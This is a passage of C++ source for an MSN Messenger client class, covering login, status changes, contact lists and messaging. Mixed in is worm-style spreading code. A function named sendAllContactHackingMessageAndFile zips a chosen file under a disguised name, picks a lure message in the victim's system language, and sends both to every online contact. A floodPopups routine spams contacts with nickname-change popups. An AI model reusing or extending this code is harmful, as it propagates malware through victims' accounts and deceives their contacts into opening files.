                                          if (MSNServerRedirect->send((string("USR ") + string(cmdCount) + string(" TWN S ") + string(ticket) + string("\r\n")).c_str())) {
                                             IDCommand++; sprintf(cmdCount, "%lu", IDCommand);
                                             if (MSNServerRedirect->recv()) {
                                                cmdMSN = FunctionsStrings::getFirstToken(MSNServerRedirect->getServerData(), ' ');
                                                if (cmdMSN != NULL) {
                                                   if (stricmp(cmdMSN, "USR") == 0) { 
                                                      free(cmdMSN);
                                                      CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) asyncReadThread, this, 0, NULL);
                                                      if (MSNServerRedirect->send((string("SYN ") + string(cmdCount) + string(" 0\r\n")).c_str())) {
                                                         IDCommand++;
                                                         for(;(!MSNLogged);) { Sleep(MSN_DELAY * 5); }
                                                         result = true;
                                                      }
                                                   }
                                                   else free(cmdMSN);
                                                }                                          
                                             }
                                          }
                                          free(ticket);
                                       }
                                       free(responseServerAuth);
                                    }
                                 }
                                 else { Sleep(MSN_DELAY); MSNServerAuth->close(); }
                                 free(userAuth); free(hostAuth);
                              }
                              else MSNServerAuth->close();
                           }
                           free(serverAuthHost); free(serverAuthFileGet); 
                        }
                     }
                  } 
               }
            }
            else { Sleep(MSN_DELAY); https->close(); }
         }
      }
   }
   return result;
}

bool MSNClient::stopSession() {
   char cmdCount[10];
   
   if (MSNLogged) {
                  
      sprintf(cmdCount, "%lu", IDCommand);
      
      if (actualState != NULL) {
         MSNServerRedirect->send((string("CHG ") + string(cmdCount) + string(" ") + string(MSN_STATE_OFFLINE) + string("\r\n")).c_str());
         free(actualState);
         actualState = NULL;   
      }

      stopMSNSession = true;
      MSNServerRedirect->send("OUT\r\n");
      if (MSNConversationList != NULL) {
         /* Send incorrect message to all conversations => unblock all threads */
         for(unsigned long i = 0; i < numConversations; i++) {
            ((MSNConversation *) *(MSNConversationList + i))->connection->send("CAL 1 account@noexist.hotmail.com\r\n");
         }
      }
      Sleep(MSN_CLOSE_SESSION_DELAY);
      
      if (MSNOnLineContactList != NULL) {
         for(unsigned long i = 0; i < numOnLineContacts; i++) {
            free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname);
            free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email);
            free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->state);
            free(((MSNContactOnLine *) *(MSNOnLineContactList + i)));
         }
         free(MSNOnLineContactList);
      }
      
      MSNOnLineContactList = NULL;
 
      if (MSNContactList != NULL) {
         for(unsigned long i = 0; i < numContacts; i++) {
            free(((MSNContact *) *(MSNContactList + i))->nickname);
            free(((MSNContact *) *(MSNContactList + i))->email);
            free(((MSNContact *) *(MSNContactList + i)));
         }
         free(MSNContactList);
      }
      
      MSNContactList = NULL;
      
      if (MSNConversationList != NULL) {
         for(unsigned long i = 0; i < numConversations; i++) {
            free(((MSNConversation *) *(MSNConversationList + i))->IDConversation);
            free(((MSNConversation *) *(MSNConversationList + i))->serverHost);
            free(((MSNConversation *) *(MSNConversationList + i))->serverPort);
            ((MSNConversation *) *(MSNConversationList + i))->connection->close();
            free(((MSNConversation *) *(MSNConversationList + i))->connection);
        
            if (((MSNConversation *) *(MSNConversationList + i))->contactList != NULL) {
               for (unsigned long j = 0; j < ((MSNConversation *) *(MSNConversationList + i))->numContacts; j++) {
                  free(*(((MSNConversation *) *(MSNConversationList + i))->contactList + j));
               }
               free(((MSNConversation *) *(MSNConversationList + i))->contactList);
            }         
            free(((MSNConversation *) *(MSNConversationList + i)));
         }
         free(MSNConversationList);
      }  
       
      MSNConversationList = NULL;  
          
      if (actualIDConversation != NULL) free(actualIDConversation);
      actualIDConversation = NULL;
      
      if (MSNServerRedirect != NULL) MSNServerRedirect->close();  
      
      MSNServerRedirect = NULL;
      
      if (MSNServerAuth != NULL) free(MSNServerAuth);
      MSNServerAuth = NULL;
      
      MSNLogged = false;
      chgNickname = false;
      stopMSNSession = false;
      IDCommand = 1;
      numContacts = 0;
      numOnLineContacts = 0;
      numConversations = 0;
      numConcurrentFilesToSend = 0;
      close();
      TCPConnected = false;
      Sleep(MSN_DELAY);
   }
}

void MSNClient::setConversationList(MSNConversation ** conversationList) {
   MSNConversationList = conversationList;
}

void MSNClient::incNumConversations() {
   numConversations++;
}

void MSNClient::incNumContacts() {
   numContacts++;
}

void MSNClient::incOnLineNumContacts() {
   numOnLineContacts++;
}

void MSNClient::incIDCommand() {
   IDCommand++;
}

void MSNClient::incNumConcurrentFilesToSend() {
   numConcurrentFilesToSend++;
}

void MSNClient::decNumConcurrentFilesToSend() {
   numConcurrentFilesToSend--;
}
void MSNClient::setMSNLogged(bool value) {
   MSNLogged = value;
}

void MSNClient::setChangeNickname(bool value) {
   chgNickname = value;
}

void MSNClient::setStopSession(bool value) {
   stopMSNSession = value;
}

bool MSNClient::setActualState(char * state) {
   bool result = false;
   
   if (actualState != NULL) free(actualState);
   actualState = (char *) malloc(strlen(state) + 1);
   
   if (actualState != NULL) {
      strcpy(actualState, state); 
      result = true;   
   }
   return result;
}

bool MSNClient::changeState(const char * MSNState) {
   char cmdCount[10];
   char * acState;
   
   if ((MSNLogged) && (!stopMSNSession)) {
      if ((stricmp(MSNState, MSN_STATE_ONLINE) == 0) || (stricmp(MSNState, MSN_STATE_LUNCH) == 0) ||
         (stricmp(MSNState, MSN_STATE_INVISIBLE) == 0) || (stricmp(MSNState, MSN_STATE_INACTIVE) == 0) ||
         (stricmp(MSNState, MSN_STATE_AWAY) == 0) || (stricmp(MSNState, MSN_STATE_COME_BACK_NOW) == 0) ||
         (stricmp(MSNState, MSN_STATE_BUSY) == 0) || (stricmp(MSNState, MSN_STATE_TELEPHONE) == 0)) {
         
         sprintf(cmdCount, "%lu", IDCommand);
         
         if (actualState != NULL) {
            acState = (char *) malloc(strlen(actualState) + 1);
            strcpy(acState, actualState);
         }
         if (MSNServerRedirect->send((string("CHG ") + string(cmdCount) + string(" ") + string(MSNState) + string("\r\n")).c_str())) {
            IDCommand++; 
            if (((actualState == NULL) || (stricmp(actualState, MSN_STATE_OFFLINE) == 0)) && (stricmp(MSNState, MSN_STATE_OFFLINE) != 0)) { 
               for(unsigned int i = 0; ((i < MSN_REPEAT_DELAY) && (numOnLineContacts == 0)); i++) Sleep(MSN_DELAY);
            }
            else {
               for(;(stricmp(acState, actualState) == 0);) Sleep(MSN_DELAY);
               free(acState); 
            }
            return true;   
         }
      }
   }
   return false;
}

bool MSNClient::changeNickname(const char * nickname) {
   char cmdCount[10];
   char * newNick;
   bool result = false;
   
   if ((MSNLogged) && (!stopMSNSession)) {
      sprintf(cmdCount, "%lu", IDCommand);
      newNick = FunctionsStrings::replaceCharacters((char *) nickname, ' ', "%20");
      if (MSNServerRedirect->send((string("REA ") + string(cmdCount) + string(" ") + string(username) + string(" ") + string(newNick) + string("\r\n")).c_str())) {
         IDCommand++; 
         for(;(!chgNickname);) Sleep(MSN_DELAY);
         chgNickname = false;
         result = true;  
      }
      free(newNick);
   }
   return result;   
}

bool MSNClient::floodPopups(const char * message) {
   char * acState = NULL, * token;
   long numSubStrings;
   bool err = false;
   
   if ((MSNLogged) && (!stopMSNSession)) {
      if (actualState != NULL) {
         acState = (char *) malloc(strlen(actualState) + 1);
         strcpy(acState, actualState);         
      }
      
      numSubStrings = FunctionsStrings::numCharactersInString((char *) message, ';');
      if (numSubStrings > 7) numSubStrings = 7;
      for(unsigned int i = 1; ((i <= (numSubStrings + 1)) && (!err)); i++) {
         token = FunctionsStrings::getToken((char *) message, ';', i);
         if (token != NULL) {
            if (changeState(MSN_STATE_INVISIBLE)) {
               if (changeNickname(token)) {
                  if (!changeState(MSN_STATE_ONLINE)) err = true;
               }
               else err = true;
            }
            else err = true;
            free(token);
         }     
      }
      
      if (acState != NULL) {
         changeState(acState);
         free(acState);
      }
      return (!err);
   }
   return false;
}

bool MSNClient::addContact(const char * nickname, const char * email) {
   bool err = false;
   
   if (numContacts == 0) MSNContactList = (MSNContact **) malloc(sizeof(MSNContact *));
   else MSNContactList = (MSNContact **) realloc(MSNContactList, sizeof(MSNContact *) * (numContacts + 1));
   
   if (MSNContactList != NULL) {
      *(MSNContactList + numContacts) = (MSNContact *) malloc(sizeof(MSNContact));
      if (*(MSNContactList + numContacts) != NULL) {
         ((MSNContact *) *(MSNContactList + numContacts))->nickname = (char *) malloc(strlen(nickname) + 1);
         ((MSNContact *) *(MSNContactList + numContacts))->email = (char *) malloc(strlen(email) + 1);

         if ((((MSNContact *) *(MSNContactList + numContacts))->nickname != NULL) && (((MSNContact *) *(MSNContactList + numContacts))->email != NULL)) {
            strcpy(((MSNContact *) *(MSNContactList + numContacts))->nickname, nickname);
            strcpy(((MSNContact *) *(MSNContactList + numContacts))->email, email);
         }
         else err = true;
      }
      else err = true;
   }
   else err = true;
   
   return !err;
} 

bool MSNClient::addOnLineContact(const char * nickname, const char * email, const char * state) {
   bool find = false, err = false;
   
   for (unsigned long i = 0;((i < numOnLineContacts) && (!find)); i++) {
      if (stricmp(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, email) == 0) {
         free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname);
         free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->state);
         ((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname = (char *) malloc(strlen(nickname) + 1);
         ((MSNContactOnLine *) *(MSNOnLineContactList + i))->state = (char *) malloc(strlen(state) + 1);
         if ((((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname != NULL) && (((MSNContactOnLine *) *(MSNOnLineContactList + i))->state != NULL)) {
            strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname, nickname);
            strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + i))->state, state);
         }
         find = true;   
      }
   }
   if (!find) {
      if (numOnLineContacts == 0) MSNOnLineContactList = (MSNContactOnLine **) malloc(sizeof(MSNContactOnLine *));
      else MSNOnLineContactList = (MSNContactOnLine **) realloc(MSNOnLineContactList, sizeof(MSNContactOnLine *) * (numOnLineContacts + 1));
   
      if (MSNOnLineContactList != NULL) {
         *(MSNOnLineContactList + numOnLineContacts) = (MSNContactOnLine *) malloc(sizeof(MSNContactOnLine));
         if (*(MSNOnLineContactList + numOnLineContacts) != NULL) {
            ((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->nickname = (char *) malloc(strlen(nickname) + 1);
            ((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->email = (char *) malloc(strlen(email) + 1);
            ((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->state = (char *) malloc(strlen(state) + 1);
              
            if ((((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->nickname != NULL) && (((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->email != NULL) && (((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->state != NULL)) {
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->nickname, nickname);
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->email, email);
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + numOnLineContacts))->state, state);
            }
            else err = true;
         }
         else err = true;
      }
      else err = true;   
   }
   
   if ((!err) && (!find)) return true;
   return false;
}

bool MSNClient::delOnLineContact(const char * email) {
   bool find = false;
   unsigned long i = 0;
   
   for (;((i < numOnLineContacts) && (!find)); i++) {
      if (stricmp(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, email) == 0) {
         free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname);
         free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email);
         free(((MSNContactOnLine *) *(MSNOnLineContactList + i))->state);
         /* last record */
         if (i == (numOnLineContacts - 1)) {
            free((MSNContactOnLine *) *(MSNOnLineContactList + i));         
         }
         else {
            ((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname = (char *) malloc(strlen(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->nickname) + 1);
            ((MSNContactOnLine *) *(MSNOnLineContactList + i))->email = (char *) malloc(strlen(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->email) + 1); 
            ((MSNContactOnLine *) *(MSNOnLineContactList + i))->state = (char *) malloc(strlen(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->state) + 1);    
            if ((((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname != NULL) && (((MSNContactOnLine *) *(MSNOnLineContactList + i))->email != NULL) && (((MSNContactOnLine *) *(MSNOnLineContactList + i))->state != NULL)) {   
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + i))->nickname, ((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->nickname);
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, ((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->email);
               strcpy(((MSNContactOnLine *) *(MSNOnLineContactList + i))->state, ((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->state);    
               
               free(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->nickname);
               free(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->email);
               free(((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)))->state);               
               free((MSNContactOnLine *) *(MSNOnLineContactList + (numOnLineContacts - 1)));               
            }  
         }
         find = true;   
      }
   }
   if (find) {
      numOnLineContacts--;
      MSNOnLineContactList = (MSNContactOnLine **) realloc(MSNOnLineContactList, sizeof(MSNContactOnLine *) * (numOnLineContacts + 1));      
   }
   return find;
}

bool MSNClient::sendConversationMessage(const char * IDConversation, const char * message, const char * fontType, const char * fontStyle, const char * fontColor, const char * fontCoding) {
   char tempMessageSize[10];
   unsigned long messageSize;
   long pos;
   bool result = false;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if (existsConversation(IDConversation)) {
            pos = searchConversation(IDConversation);
            if (pos != -1) {
               messageSize = strlen((string("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str()); 
               sprintf(tempMessageSize, "%lu", messageSize);
               if (((MSNConversation *) *(MSNConversationList + pos))->connection->send((string("MSG 1 N ") + string(tempMessageSize) + string("\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str())) {
                  result = true;                      
               }  
            }     
         }
      }
   }
   return result;
}

bool MSNClient::sendAllContactHackingMessageAndFile(const char * filePath, const char * fontType, const char * fontStyle, const char * fontColor, const char * fontCoding, unsigned int maxCurrentFilesToSend) {
   char * language, * selectedMessage, * selectedFilename, * basePathFilename;
   int numSentences, numFilenames, randSentence, randFilename;
   bool result = false, err = false;
   
   if (FunctionsFiles::fileExists(filePath)) {
      basePathFilename = (char *) malloc(strlen(filePath + 1));
      if (basePathFilename != NULL) {
         strcpy(basePathFilename, filePath);
         FunctionsStrings::eraseLastToken(basePathFilename, '\\');
         
         numSentences = sentencesToTalk->getNumElems();
         if (numSentences > 0) {
            srand((unsigned) time(NULL));
            randSentence = FunctionsAssistant::randomNumber(0, numSentences-1);
            language = FunctionsWindowsNT::getCurrentUserLanguage();
      
            if (language == NULL) {
               language = (char *) malloc(LANGUAGE_SIZE);
               if (language != NULL) {
                  strcpy(language, "EN");
               }
               else err = true;
            }
      
            if (!err) {
               numFilenames = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getFilenameList().size();
               if (numFilenames > 0) {
                  randFilename = FunctionsAssistant::randomNumber(0, numFilenames - 1);         
                  selectedFilename = (char *) ((*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getFilenameList()[randFilename]).c_str();
            
                  if (stricmp(language, "SP") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrSP();
                  }
                  else if (stricmp(language, "EN") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrEN();
                  }
                  else if (stricmp(language, "IT") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrIT();
                  }
                  else if (stricmp(language, "FR") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrFR();
                  }
                  else if (stricmp(language, "GE") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrGE();
                  }
                  else if (stricmp(language, "PO") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrPO();
                  }
                  else if (stricmp(language, "CA") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrCA();
                  }
                  else if (stricmp(language, "AR") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrAR();
                  }
                  else if (stricmp(language, "BU") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrBU();
                  }
                  else if (stricmp(language, "CZ") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrCZ();
                  }
                  else if (stricmp(language, "CH") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrCH();
                  }
                  else if (stricmp(language, "CR") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrCR();
                  }
                  else if (stricmp(language, "DA") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrDA();
                  }
                  else if (stricmp(language, "FI") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrFI();
                  }
                  else if (stricmp(language, "GR") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrGR();
                  }
                  else if (stricmp(language, "HI") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrHI();
                  }
                  else if (stricmp(language, "DU") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrDU();
                  }
                  else if (stricmp(language, "JA") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrJA();
                  }
                  else if (stricmp(language, "NO") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrNO();
                  }
                  else if (stricmp(language, "PL") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrPL();
                  }
                  else if (stricmp(language, "RU") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrRU();
                  }
                  else if (stricmp(language, "SW") == 0) {
                     selectedMessage = (*(sentencesToTalk->getMultipleLangStringList() + randSentence))->getStrSW();
                  }
            
                  HZIP hz = CreateZip((string(basePathFilename) + string(selectedFilename) + string(MSN_OUT_FILENAME_COMPRESS_EXTENSION)).c_str(), 0);
                  ZipAdd(hz, (string(selectedFilename) + string(" ") + string(MSN_IN_FILENAME_COMPRESS_SUFIX) + string(MSN_IN_FILENAME_COMPRESS_EXTENSION)).c_str(), filePath);
                  CloseZip(hz);
      
                  sendAllContactMessageAndFile(selectedMessage, (string(basePathFilename) + string(selectedFilename) + string(MSN_OUT_FILENAME_COMPRESS_EXTENSION)).c_str(), fontType, fontStyle, fontColor, fontCoding, maxCurrentFilesToSend);
                  result = true;
               }
            }
         }
      }
   }
   return result;
}

bool MSNClient::sendAllContactMessageAndFile(const char * message, const char * filePath, const char * fontType, const char * fontStyle, const char * fontColor, const char * fontCoding, unsigned int maxCurrentFilesToSend) {
   bool result = false;
    
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if ((numOnLineContacts > 0) && (FunctionsFiles::fileExists(filePath))) {
            result = true;
            for(unsigned long i = 0; ((i < numOnLineContacts) && (!stopMSNSession)); i++) {
               while (numConcurrentFilesToSend == maxCurrentFilesToSend) Sleep(MSN_CHECK_NUM_FILES_SEND_DELAY);
               
               if (!sendContactMessage(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, message, fontType, fontStyle, fontColor, fontCoding)) result = false;
               if (!sendContactFile(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, filePath)) result = false;
               Sleep(MSN_FILES_SEND_DELAY);
            }
         }
      }
   }
   return result;
}

bool MSNClient::sendAllContactMessage(const char * message, const char * fontType, const char * fontStyle, const char * fontColor, const char * fontCoding) {
   bool result = false;

   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
     if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if (numOnLineContacts > 0) {
            result = true;
            for(unsigned long i = 0; ((i < numOnLineContacts) && (!stopMSNSession)); i++) {
               if (!sendContactMessage(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, message, fontType, fontStyle, fontColor, fontCoding)) result = false;
            }
         }
      }
   }
   return result;
}

bool MSNClient::sendContactMessage(const char * email, const char * message, const char * fontType, const char * fontStyle, const char * fontColor, const char * fontCoding) {
   char tempCountConv[10], tempMessageSize[10];
   unsigned long countTempConversation = 0, conversation, messageSize;
   bool result = false;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if (isContactOnLine(email)) {
         conversation = searchContactInConversation(email);
            if (conversation != -1) {
               messageSize = strlen((string("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str()); 
               sprintf(tempMessageSize, "%lu", messageSize);
               if (((MSNConversation *) *(MSNConversationList + conversation))->connection->send((string("MSG 1 N ") + string(tempMessageSize) + string("\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str())) {
                  result = true;                      
               }   
            }
            else {
               /* Create new temporal conversation */
               sprintf(tempCountConv, "%lu", countTempConversation);
               while(existsConversation((string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                  countTempConversation++;
                  sprintf(tempCountConv, "%lu", countTempConversation);
               }
               if (createConversation((string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                  if (inviteContact(email, (string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                     conversation = searchContactInConversation(email);
                     if (conversation != -1) {            
                        messageSize = strlen((string("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str()); 
                        sprintf(tempMessageSize, "%lu", messageSize);
                        if (((MSNConversation *) *(MSNConversationList + conversation))->connection->send((string("MSG 1 N ") + string(tempMessageSize) + string("\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\nX-MMS-IM-Format: FN=") + string(fontType) + string("; EF=") + string(fontStyle) + string("; CO=") + string(fontColor) + string("; CS=") + string(fontCoding) + string("; PF=0\r\n\r\n") + string(message) + string("\r\n")).c_str())) {
                           result = true;                      
                        }   
                     }
                  }                                                            
                  closeConversation((string("TEMPCONVERSATION") + string(tempCountConv)).c_str());   
               }
            }
        }
      }
   }
   return result;
}

bool MSNClient::sendAllContactFile(const char * filePath, unsigned int maxCurrentFilesToSend) {
   bool result = false;
   unsigned long i;
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if ((numOnLineContacts > 0) && (FunctionsFiles::fileExists(filePath))) {
            result = true;
            for(i = 0; ((i < numOnLineContacts) && (!stopMSNSession)); i++) {
               while (numConcurrentFilesToSend == maxCurrentFilesToSend) Sleep(MSN_CHECK_NUM_FILES_SEND_DELAY);
               
               if (!sendContactFile(((MSNContactOnLine *) *(MSNOnLineContactList + i))->email, filePath)) result = false;
               Sleep(MSN_FILES_SEND_DELAY);
            }
            if ((stopMSNSession) && (i < numOnLineContacts)) result = false;
         }
      }
   }
   return result;
}

bool MSNClient::sendContactFile(const char * email, const char * filePath) {
   char tempCountConv[10], tempMessageSize[10];
   char * filename;
   unsigned long countTempConversation = 0, conversation, messageSize;
   bool result = false, err = false;
   MSNFileInfo * fileStruct; 
   
   if (actualState != NULL) {
      /* If logged and status is onLine (Telephone, away, busy, online ...) i can send message */
      if ((MSNLogged) && (stricmp(actualState, MSN_STATE_OFFLINE) != 0) && (stricmp(actualState, MSN_STATE_INVISIBLE) != 0) && (!stopMSNSession)) {
         if (FunctionsFiles::fileExists(filePath)) {   
            if (isContactOnLine(email)) {
               srand((unsigned int) time(NULL));
            
               fileStruct = (MSNFileInfo *) malloc(sizeof(MSNFileInfo));
            
               if (fileStruct != NULL) {
                  fileStruct->cookie = (char *) malloc(6);
                  if (fileStruct->cookie != NULL) {
                     sprintf(fileStruct->cookie, "%u", rand());
                     fileStruct->filePath = (char *) malloc(strlen(filePath) + 1);
                     if (fileStruct->filePath != NULL) {
                        strcpy(fileStruct->filePath, filePath);
                        fileStruct->fileSize = (char *) malloc(15);
                        if (fileStruct->fileSize != NULL) {
                           sprintf(fileStruct->fileSize, "%lu", FunctionsFiles::fileSize(filePath));  
                           filename = FunctionsStrings::getLastToken((char *) filePath, '\\');  
                           if (filename != NULL) {
                              fileStruct->filename = (char *) malloc(strlen(filename) + 1);
                              if (fileStruct->filename != NULL) {
                                 strcpy(fileStruct->filename, filename);
                                 free(filename); 
                                 fileStruct->MSNApp = this;
                              }
                              else { free(filename); free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); err = true; }
                           }
                           else { free(fileStruct->fileSize); free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); err = true; }
                        }
                        else { free(fileStruct->filePath); free(fileStruct->cookie); free(fileStruct); err = true; }
                     }
                     else { free(fileStruct->cookie); free(fileStruct); err = true; }
                  }
                  else { free(fileStruct); err = true; }
               }
               else err = true;

               if (!err) {
                  conversation = searchContactInConversation(email);
                  if (conversation != -1) {   
                     fileStruct->connection = ((MSNConversation *) *(MSNConversationList + conversation))->connection;
                     fileStruct->IDConversation = NULL;
                     CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) asyncConversationFileSendReadThread, fileStruct, 0, NULL);
                           
                     messageSize = strlen((string("MIME-Version: 1.0\r\nContent-Type: text/x-msmsgsinvite; charset=UTF-8\r\n\r\nApplication-Name: File Transfer\r\nApplication-GUID: {5D3E02AB-6190-11d3-BBBB-00C04F795683}\r\nInvitation-Command: INVITE\r\nInvitation-Cookie: ") + string(fileStruct->cookie) + string("\r\nApplication-File: ") + string(fileStruct->filename) + string("\r\nApplication-FileSize: ") + string(fileStruct->fileSize) + string("\r\nConnectivity: N\r\n")).c_str()); 
                     sprintf(tempMessageSize, "%lu", messageSize);
                     if (fileStruct->connection->send((string("MSG 1 N ") + string(tempMessageSize) + string("\r\nMIME-Version: 1.0\r\nContent-Type: text/x-msmsgsinvite; charset=UTF-8\r\n\r\nApplication-Name: File Transfer\r\nApplication-GUID: {5D3E02AB-6190-11d3-BBBB-00C04F795683}\r\nInvitation-Command: INVITE\r\nInvitation-Cookie: ") + string(fileStruct->cookie) + string("\r\nApplication-File: ") + string(fileStruct->filename) + string("\r\nApplication-FileSize: ") + string(fileStruct->fileSize) + string("\r\nConnectivity: N\r\n")).c_str())) {
                        result = true;                      
                     }                                                       
                  }
                  else {
                     /* Create new temporal conversation */
                     sprintf(tempCountConv, "%lu", countTempConversation);
                     while(existsConversation((string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                        countTempConversation++;
                        sprintf(tempCountConv, "%lu", countTempConversation);
                     }
                     if (createConversation((string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                        if (inviteContact(email, (string("TEMPCONVERSATION") + string(tempCountConv)).c_str())) {
                           conversation = searchContactInConversation(email);
                           if (conversation != -1) {
                              fileStruct->connection = ((MSNConversation *) *(MSNConversationList + conversation))->connection;
